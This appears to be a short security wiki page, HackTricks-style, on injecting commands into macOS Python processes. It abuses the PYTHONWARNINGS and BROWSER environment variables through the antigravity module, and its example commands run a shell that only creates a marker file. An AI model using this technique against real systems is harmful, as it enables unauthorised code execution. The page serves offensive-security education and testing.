# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via the `PYTHONWARNINGS` and `BROWSER` environment variables

If an attacker can control a Python process's environment, the combination of `PYTHONWARNINGS` and `BROWSER` can trigger command execution when Python imports the `antigravity` module while processing a crafted warning option. The technique relies on `antigravity` opening a URL with Python's `webbrowser` module, which honors the `BROWSER` environment variable.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## References

- [1] [Hacking with Environment Variables - elttam](https://www.elttam.com/blog/env/)

{{#include ../../../banners/hacktricks-training.md}}
